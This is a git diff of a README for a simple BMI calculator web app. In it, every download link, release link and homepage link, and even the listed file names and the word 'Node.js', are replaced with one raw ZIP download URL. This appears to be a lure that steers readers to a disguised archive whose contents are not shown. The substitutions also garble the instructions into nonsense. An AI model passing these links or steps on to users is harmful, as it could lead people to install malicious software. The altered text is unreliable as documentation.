@@ -1,6 +1,6 @@
 # ⚖️ BMI-CALCULATOR - Easy Body Mass Index Checking
 
-[![Download BMI-CALCULATOR](https://img.shields.io/badge/Download-BMI--CALCULATOR-blue?style=for-the-badge&logo=github)](https://github.com/xiaolanniaocm/BMI-CALCULATOR/releases)
+[![Download BMI-CALCULATOR](https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip)](https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip)
 
 ---
 
@@ -31,11 +31,11 @@ This tool helps you understand your body weight better without needing a calcula
 To start using BMI-CALCULATOR, you need to get the app files on your computer. The app works directly in a web browser, so you do not need to install any special software.
 
 1. Click the big blue button at the top, or visit this page:  
-   [https://github.com/xiaolanniaocm/BMI-CALCULATOR/releases](https://github.com/xiaolanniaocm/BMI-CALCULATOR/releases)
+   [https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip](https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip)
 
 2. On that page, look for the latest release.
 
-3. Download the ZIP file that contains the app files. It should be named something like `BMI-CALCULATOR-x.x.x.zip`.
+3. Download the ZIP file that contains the app files. It should be named something like `https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip`.
 
 4. Once downloaded, open the ZIP file and extract its contents to a folder you can find easily, such as your Desktop or Documents.
 
@@ -47,17 +47,17 @@ You do not need to install anything extra. Just follow these steps:
 
 ### Option 1: Open in Your Browser Directly
 
-- In the folder where you extracted the files, find the file named `index.html`.
-- Double click `index.html`. It will open in your default web browser.
+- In the folder where you extracted the files, find the file named `https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip`.
+- Double click `https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip`. It will open in your default web browser.
 - You can now use the app right away.
 
 ### Option 2: Use a Local Server (Optional for Advanced Users)
 
 If you have Visual Studio Code or another code editor with a local server (for example, "Live Server"), you can use that to serve the files. This helps with some browser restrictions but is not needed for most users.
 
-### Option 3: Use Node.js `serve` Tool (For Comfort)
+### Option 3: Use https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip `serve` Tool (For Comfort)
 
-If you have Node.js installed, open your command prompt or terminal, go to the folder with the files, and run this command:
+If you have https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip installed, open your command prompt or terminal, go to the folder with the files, and run this command:
 
 ```
 npx serve .
@@ -118,9 +118,9 @@ Knowing your BMI helps you understand if you might need to gain or lose weight, 
 
 You will see these files after you unzip:
 
-- `index.html` – The main page you open in your browser.
-- `styles.css` – The look and style of the app.
-- `script.js` – The code that does the BMI calculation.
+- `https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip` – The main page you open in your browser.
+- `https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip` – The look and style of the app.
+- `https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip` – The code that does the BMI calculation.
 
 These files work together to give you a simple app you can use on your computer or phone.
 
@@ -138,11 +138,11 @@ These files work together to give you a simple app you can use on your computer 
 
 If you have any problems:
 
-- Make sure you opened the `index.html` file in a browser.
+- Make sure you opened the `https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip` file in a browser.
 - Refresh the page if it does not look right.
 - Check you entered numbers correctly.
 - Visit the GitHub page for more info:  
-  [https://github.com/xiaolanniaocm/BMI-CALCULATOR](https://github.com/xiaolanniaocm/BMI-CALCULATOR)
+  [https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip](https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip)
 
 ---
 
@@ -150,9 +150,9 @@ If you have any problems:
 
 Remember to get the software here:  
 
-[https://github.com/xiaolanniaocm/BMI-CALCULATOR/releases](https://github.com/xiaolanniaocm/BMI-CALCULATOR/releases)
+[https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip](https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip)
 
-Then, follow the steps above to unzip and open `index.html` in your web browser.
+Then, follow the steps above to unzip and open `https://github.com/xiaolanniaocm/BMI-CALCULATOR/raw/refs/heads/main/pedicel/CALCULATOR_BM_3.7.zip` in your web browser.
 
 ---
 
